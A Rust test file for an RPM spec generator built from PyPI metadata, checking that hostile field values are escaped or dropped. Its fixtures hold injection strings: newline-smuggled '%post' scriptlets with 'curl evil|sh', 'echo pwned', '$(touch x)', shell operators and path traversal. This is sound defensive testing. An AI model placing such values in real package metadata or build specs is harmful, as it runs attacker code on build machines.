use super::*;

fn release(
    license: ap_ecosystem::pypi::License,
    homepage: Option<&str>,
) -> ap_ecosystem::pypi::Release {
    ap_ecosystem::pypi::Release {
        name: "pkg".to_string(),
        version: "1.0".to_string(),
        summary: Some("A package".to_string()),
        homepage: homepage.map(str::to_string),
        license,
        requires_python: None,
        requires_dist: Vec::new(),
        yanked: false,
        sdist: ap_ecosystem::pypi::Sdist {
            filename: String::new(),
            url: String::new(),
            sha256: String::new(),
            size: 0,
        },
    }
}

fn sdist_spec(release: &ap_ecosystem::pypi::Release) -> String {
    let build_system = BuildSystem {
        requires: vec![],
        backend: None,
    };
    post_process_with_sdist(
        "Name: pkg\nVersion: 1.0\nLicense: old\nURL: old\n%changelog\n",
        release,
        &build_system,
        SdistFacts {
            has_tests: false,
            has_c_extensions: false,
            top_level_tests_dir: None,
            install_entries: None,
            console_scripts: Vec::new(),
        },
    )
}

fn no_injected_line(spec: &str) {
    assert!(
        !spec
            .lines()
            .any(|l| l.starts_with("%post") || l.starts_with("curl")),
        "{spec}"
    );
}

#[test]
fn license_newline_cannot_inject_a_scriptlet() {
    let r = release(
        ap_ecosystem::pypi::License::FreeText("MIT\n%post\ncurl evil|sh".to_string()),
        Some("https://example.org"),
    );
    let spec = sdist_spec(&r);
    no_injected_line(&spec);
    assert!(
        spec.contains("License:        MIT %%post curl evil|sh\n"),
        "{spec}"
    );
}

#[test]
fn summary_newline_cannot_inject_a_scriptlet_into_the_description() {
    let mut r = release(
        ap_ecosystem::pypi::License::Spdx("MIT".to_string()),
        Some("https://example.org"),
    );
    r.summary = Some("Fast parser\n%post\ncurl evil|sh 100%".to_string());
    let build_system = BuildSystem {
        requires: vec![],
        backend: None,
    };
    let spec = post_process_with_sdist(
        "Name: pkg\nVersion: 1.0\n%description\nold body\n%prep\n%changelog\n",
        &r,
        &build_system,
        SdistFacts {
            has_tests: false,
            has_c_extensions: false,
            top_level_tests_dir: None,
            install_entries: None,
            console_scripts: Vec::new(),
        },
    );
    no_injected_line(&spec);
    assert!(!spec.contains("old body"), "{spec}");
    assert!(
        spec.contains("%description\nFast parser %%post curl evil|sh 100%%\n\n%prep\n"),
        "{spec}"
    );
}

#[test]
fn a_top_level_entry_named_like_the_dist_info_does_not_panic() {
    let layout = ap_ecosystem::sdist::WheelLayout {
        importable: Some("pkg".into()),
        files: vec![
            "pkg/__init__.py".into(),
            "pkg-1.0.dist-info".into(),
            "pkg-1.0.dist-info/METADATA".into(),
        ],
        dist_info: Some("pkg-1.0.dist-info".into()),
        ..Default::default()
    };
    // The bare entry is not a member of the dist-info directory: the layout
    // is not one that can be listed without guessing, so the review fills it in.
    assert_eq!(wheel_files_entries(&layout, "sitedir", &[]), None);
}

#[test]
fn a_wheel_member_that_traverses_is_not_listed_blind() {
    // `pkg/../../x.py` would own `%{sitedir}/pkg/..` and reach outside it
    let layout = ap_ecosystem::sdist::WheelLayout {
        importable: Some("pkg".into()),
        files: vec![
            "pkg/__init__.py".into(),
            "pkg/../../x.py".into(),
            "pkg-1.0.dist-info".into(),
            "pkg-1.0.dist-info/METADATA".into(),
        ],
        dist_info: Some("pkg-1.0.dist-info".into()),
        ..Default::default()
    };
    assert_eq!(wheel_files_entries(&layout, "sitedir", &[]), None);
}

#[test]
fn homepage_newline_cannot_inject_a_scriptlet() {
    let r = release(
        ap_ecosystem::pypi::License::Spdx("MIT".to_string()),
        Some("https://example.org\n%post\ncurl evil|sh"),
    );
    let spec = sdist_spec(&r);
    no_injected_line(&spec);
    assert!(
        spec.contains("URL:            https://example.org %%post curl evil|sh\n"),
        "{spec}"
    );
}

#[test]
fn spdx_expression_and_default_url_are_unchanged() {
    let r = release(
        ap_ecosystem::pypi::License::Spdx("MIT OR Apache-2.0".to_string()),
        None,
    );
    let spec = sdist_spec(&r);
    assert!(
        spec.contains("License:        MIT OR Apache-2.0\n"),
        "{spec}"
    );
    assert!(
        spec.contains("URL:            https://pypi.org/project/%{name}\n"),
        "{spec}"
    );
}

#[test]
fn monorepo_skeleton_license_is_one_line_and_escaped() {
    let r = release(
        ap_ecosystem::pypi::License::FreeText("MIT\n%post\ncurl evil|sh".to_string()),
        Some("https://example.org"),
    );
    let spec = monorepo_skeleton("pkg", "1.0", &[], Some(&r));
    no_injected_line(&spec);
    assert!(
        spec.contains("License:        MIT %%post curl evil|sh\n"),
        "{spec}"
    );
}

#[test]
fn wheel_skeleton_license_percent_is_doubled() {
    let r = release(
        ap_ecosystem::pypi::License::FreeText("GPL %post".to_string()),
        Some("https://example.org/%x"),
    );
    let spec = wheel_binary_skeleton_shared(
        "pkg",
        "1.0",
        "pkg-1.0-py3-none-any.whl",
        &r,
        None,
        None,
        &[],
    );
    assert!(spec.contains("License:        GPL %%post\n"), "{spec}");
    assert!(
        spec.contains("URL:            https://example.org/%%x\n"),
        "{spec}"
    );
    no_injected_line(&spec);
}

/// A dependency name the agent proposed with a newline, macro, quote or
/// shell operator is not written: the spec comes back unchanged.
#[test]
fn an_injected_dependency_name_leaves_the_spec_unchanged() {
    let spec = "BuildRequires:  %{python_module huggingface_hub >= 0.21}\n\
                    Requires:       python-huggingface_hub >= 0.21\n";
    for bad in [
        "huggingface-hub\n%pre\necho pwned",
        "huggingface-hub%{x}",
        "huggingface-hub$(x)",
        "huggingface-hub`x`",
        "huggingface-hub;x",
        "huggingface-hub|x",
        "huggingface-hub&x",
        "huggingface hub",
        "huggingface-hub'x'",
        "huggingface-hub\"x\"",
        "(huggingface-hub)",
        "",
    ] {
        assert_eq!(
            rewrite_python_module_name(spec, "huggingface_hub", bad),
            spec,
            "{bad:?}"
        );
        assert_eq!(
            rewrite_dependency_name(spec, "huggingface_hub", bad),
            spec,
            "{bad:?}"
        );
        assert_eq!(
            rewrite_dependency_name(spec, bad, "huggingface-hub"),
            spec,
            "{bad:?}"
        );
    }
}

/// A PEP 508 marker is not written: the requirement is kept, the marker is
/// dropped. A marker with a macro or a newline drops the whole entry.
#[test]
fn a_build_requirement_marker_is_dropped_and_the_requirement_kept() {
    let release = release(
        ap_ecosystem::pypi::License::Spdx("MIT".to_string()),
        Some("https://example.org"),
    );
    let build_system = BuildSystem {
        requires: vec![
            "numpy>=2; python_version>='3.9'".to_string(),
            "tomli; python_version < \"3.11\"".to_string(),
            "x; python_version%{lua:y}".to_string(),
            "z; python_version\n%pre".to_string(),
        ],
        backend: None,
    };
    let spec = "BuildRequires:  %{python_module pip}\n%changelog\n";
    let out = post_process_with_sdist(
        spec,
        &release,
        &build_system,
        SdistFacts {
            has_tests: false,
            has_c_extensions: false,
            top_level_tests_dir: None,
            install_entries: None,
            console_scripts: Vec::new(),
        },
    );
    assert!(
        out.contains("BuildRequires:  %{python_module numpy >= 2}\n"),
        "{out}"
    );
    assert!(
        out.contains("BuildRequires:  %{python_module tomli}\n"),
        "{out}"
    );
    assert!(!out.contains("python_version"), "{out}");
    assert!(!out.contains("lua"), "{out}");
    assert!(!out.contains("%pre"), "{out}");
}

/// `[build-system] requires` with an injected entry: the entry is dropped,
/// the valid ones are written, and the spec gets no extra line.
#[test]
fn an_injected_build_requirement_is_dropped_not_written() {
    let release = release(
        ap_ecosystem::pypi::License::Spdx("MIT".to_string()),
        Some("https://example.org"),
    );
    let build_system = BuildSystem {
        requires: vec![
            "setuptools\n%pre\necho pwned".to_string(),
            "wheel".to_string(),
            "cython>=3 $(x)".to_string(),
            "a%{x}".to_string(),
            "numpy >= 2, < 3".to_string(),
        ],
        backend: None,
    };
    let spec = "BuildRequires:  %{python_module pip}\n%changelog\n";
    let out = post_process_with_sdist(
        spec,
        &release,
        &build_system,
        SdistFacts {
            has_tests: false,
            has_c_extensions: false,
            top_level_tests_dir: None,
            install_entries: None,
            console_scripts: Vec::new(),
        },
    );
    assert!(
        !out.lines().any(|l| l == "%pre" || l.starts_with("%pre ")),
        "{out}"
    );
    assert!(!out.contains("pwned"), "{out}");
    assert!(!out.contains("$(x)") && !out.contains("%{x}"), "{out}");
    assert!(
        out.contains("BuildRequires:  %{python_module wheel}\n"),
        "{out}"
    );
    assert!(
        out.contains("BuildRequires:  %{python_module numpy >= 2, < 3}\n"),
        "{out}"
    );
}

/// A manifest directory with a shell or newline payload is never written
/// into the `cd` of `%build`/`%install` or into the monorepo skeleton.
#[test]
fn an_unsafe_directory_is_never_written_into_the_spec() {
    let spec = "%build\n%py3_build\n%install\n%py3_install\n";
    for bad in [
        "pkgs/$(touch x)",
        "pkgs/a\n%pre\necho pwned",
        "pkgs/%{x}",
        "a b",
        "../escape",
        "/abs",
    ] {
        assert_eq!(build_in_subdir(spec, bad), spec, "{bad:?}");
    }
    assert!(build_in_subdir(spec, "python/cuda_core").contains("%build\ncd python/cuda_core\n"),);

    let release = release(
        ap_ecosystem::pypi::License::Spdx("MIT".to_string()),
        Some("https://example.org"),
    );
    let subprojects = vec![
        ap_ecosystem::sdist::Subproject {
            dir: "ok_pkg".to_string(),
            name: Some("ok-pkg".to_string()),
        },
        ap_ecosystem::sdist::Subproject {
            dir: "bad\n%pre\necho pwned".to_string(),
            name: Some("bad".to_string()),
        },
        ap_ecosystem::sdist::Subproject {
            dir: "ok2".to_string(),
            name: Some("x\n%pre".to_string()),
        },
    ];
    let out = monorepo_skeleton("pkg", "1.0", &subprojects, Some(&release));
    assert!(
        !out.lines().any(|l| l == "%pre" || l.starts_with("%pre ")),
        "{out}"
    );
    assert!(!out.contains("pwned"), "{out}");
    assert!(out.contains("for ok_pkg/"), "{out}");
}

/// A wheel whose import name or shared library path is not shell-safe gets
/// no `%check` that runs it; the default TODO is written instead.
#[test]
fn an_unsafe_wheel_member_name_never_reaches_the_check() {
    use ap_ecosystem::sdist::WheelLayout;
    let release = release(
        ap_ecosystem::pypi::License::Spdx("MIT".to_string()),
        Some("https://example.org"),
    );
    let wheel = "pkg-1.0-py3-none-any.whl";
    let bad_import = WheelLayout {
        importable: Some("pkg;touch x".into()),
        ..Default::default()
    };
    let spec = wheel_binary_skeleton("pkg", "1.0", wheel, &release, Some(true), Some(&bad_import));
    assert!(!spec.contains("pkg;touch x"), "{spec}");

    let bad_lib = WheelLayout {
        importable: None,
        first_shared_lib: Some("a$(touch x)/lib.so.1".into()),
        ..Default::default()
    };
    let spec = wheel_binary_skeleton("pkg", "1.0", wheel, &release, Some(true), Some(&bad_lib));
    assert!(!spec.contains("$(touch x)"), "{spec}");
    assert!(!spec.contains("test -e"), "{spec}");
}
